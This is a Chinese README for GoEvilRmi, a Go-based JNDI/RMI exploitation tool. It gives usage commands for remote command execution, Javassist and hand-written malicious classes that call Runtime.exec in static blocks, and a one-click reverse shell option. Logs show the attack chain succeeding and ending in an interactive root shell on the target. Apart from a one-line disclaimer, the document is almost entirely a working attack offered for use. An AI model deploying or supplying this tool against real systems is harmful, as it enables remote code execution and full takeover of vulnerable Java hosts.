# GoEvilRmi利用工具
请注意仅在测试应用安全性时使用，勿使用于任何非法活动
# 介绍
这是一个使用golang来编写个rmi利用工具，它允许在没有Java环境的机器上运行，且单文件执行，较为方便。

# 使用说明
## 命令执行示例
```shell
./GoEvilRmi_linux_amd64 -i [本机的目标能访问到的IP地址] -c [要执行的命令]
```
假设客户端代码如下：
```java
package org.example;

import javax.naming.Context;
import javax.naming.InitialContext;

public class Main {
        public static void main(String[] args) throws Exception {
            // 我测试时使用的Java版本需要设置该值
            System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
            // create a new JNDI context
            Context ctx = new InitialContext();
            // lookup our resource
            ctx.lookup("rmi://192.168.229.3:6666/test");
            // close the context
            ctx.close();
        }
}
```
执行后程序输出如下：
```
root@maxubuntu-virtual-machine:~# ./GoEvilRmi_linux_amd64 -i 192.168.229.3 -c calc
2023/04/13 15:19:26 【控制台】 : 请使用 rmi://192.168.229.3:6666/test 来进行使用
2023/04/13 15:19:31 【RMI服务】 : 接收到请求，来自于IP：192.168.229.1:50382
2023/04/13 15:19:31 【RMI服务】 : 向客户端发送了IP地址和端口
2023/04/13 15:19:31 【RMI服务】 : 接收到客户端的内网IP地址
2023/04/13 15:19:31 【RMI服务】 : 192.168.1.3: 0
2023/04/13 15:19:31 【RMI服务】 : 接收到rmi名称 [test]
2023/04/13 15:19:31 【RMI服务】 : 已经向客户端发送Remote序列化对象，后续将交由[7777]端口的Reomte服务进行交互
2023/04/13 15:19:31 【Remote服务】 : 接收到请求，来自IP：192.168.229.1:50383
2023/04/13 15:19:31 【Remote服务】 : 向客户端发送了IP地址和端口
2023/04/13 15:19:31 【Remote服务】 : 接收到客户端上传的内网IP地址
2023/04/13 15:19:31 【Remote服务】 : 192.168.1.3:
2023/04/13 15:19:32 【Remote服务】 : 收到客户端获取序列化数据的请求
2023/04/13 15:19:32 【Remote服务】 : 已经向客户端发送第一次序列化数据
2023/04/13 15:19:33 【Remote服务】 : 收到客户端确认包
2023/04/13 15:19:33 【Remote服务】 : 已经向客户端发送第二次序列化数据，客户端即将加载远程类，交由[7777]端口的http服务进行交互
2023/04/13 15:19:33 【HTTP服务】 : 收到请求，来自IP：192.168.229.1:50386
2023/04/13 15:19:33 【HTTP服务】 : 目标Java版本为：Java/1.8.0_151
2023/04/13 15:19:33 【HTTP服务】 : 已经向目标发送恶意class，攻击流程完成。
```
经测试，当高版本的trustURLCodebase未开启时，可以获取目标的内网IP。

## 自定义加载类
```shell
./GoEvilRmi_linux_amd64 -i [本机的目标能访问到的IP地址] -f [class文件路径]
```
该方法可以指定目标需要加载的远程类，文件名必须使用 类名.xxx 的形式(xxx为任意字符)。在static代码块中编写要执行的Java代码即可，可以使用Javassit来生成恶意类：
```java
        ClassPool pool = ClassPool.getDefault();
        // 创建一个新类，继承自AbstractTranslet
        CtClass cc = pool.makeClass("Evil", pool.get(AbstractTranslet.class.getName()));
        // 添加一个静态代码块
        cc.makeClassInitializer().insertBefore("Runtime.getRuntime().exec(\"calc\");");
        cc.writefile();
```

也可以手动编写
```java
import java.io.IOException;

public class M4x {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }    
}
```
编译
```shell
javac M4x.java
```
使用
```shell
./GoEvilRmi_linux_amd64 -i 192.168.229.3 -f M4x.class
 ```

## 一键反弹设shell
仅在目标为Linux时可用
```shell
.\GoEvilRmi.exe -i 192.168.229.1 -r 12345
2023/10/11 20:28:01 【控制台】 : 请使用 rmi://192.168.229.1:6666/test 来进行使用
2023/10/11 20:28:01 【反弹shell】 : 已经在12345端口启动反弹shell监听
2023/10/11 20:28:13 【RMI服务】 : 接收到请求，来自于IP：192.168.229.3:41598
2023/10/11 20:28:13 【RMI服务】 : 向客户端发送了IP地址和端口
2023/10/11 20:28:13 【RMI服务】 : 接收到客户端的内网IP地址
2023/10/11 20:28:13 【RMI服务】 : 127.0.1.1: 0
2023/10/11 20:28:13 【RMI服务】 : 接收到rmi名称 [test]
2023/10/11 20:28:13 【RMI服务】 : 已经向客户端发送Remote序列化对象，后续将交由[7777]端口的Reomte服务进行交互
2023/10/11 20:28:13 【Remote服务】 : 接收到请求，来自IP：192.168.229.3:41178
2023/10/11 20:28:13 【Remote服务】 : 向客户端发送了IP地址和端口
2023/10/11 20:28:13 【Remote服务】 : 接收到客户端上传的内网IP地址
2023/10/11 20:28:13 【Remote服务】 : 127.0.1.1:
2023/10/11 20:28:14 【Remote服务】 : 收到客户端获取序列化数据的请求
2023/10/11 20:28:14 【Remote服务】 : 已经向客户端发送第一次序列化数据
2023/10/11 20:28:15 【Remote服务】 : 已经向客户端发送第二次序列化数据，客户端即将加载远程类，交由[7777]端口的http服务进行交互
2023/10/11 20:28:16 【HTTP服务】 : 收到请求，来自IP：192.168.229.3:41182
2023/10/11 20:28:16 【HTTP服务】 : 目标Java版本为：Java/1.8.0_151
2023/10/11 20:28:16 【HTTP服务】 : 已经向目标发送恶意class，攻击流程完成。
2023/10/11 20:28:16 【反弹shell】 : 收到连接: [192.168.229.3:40880] 即将进入到交互shell模式
root@maxubuntu-virtual-machine:~# id
id
用户id=0(root) 组id=0(root) 组=0(root)
root@maxubuntu-virtual-machine:~#
root@maxubuntu-virtual-machine:~#
```
该功能不需要本机安装nc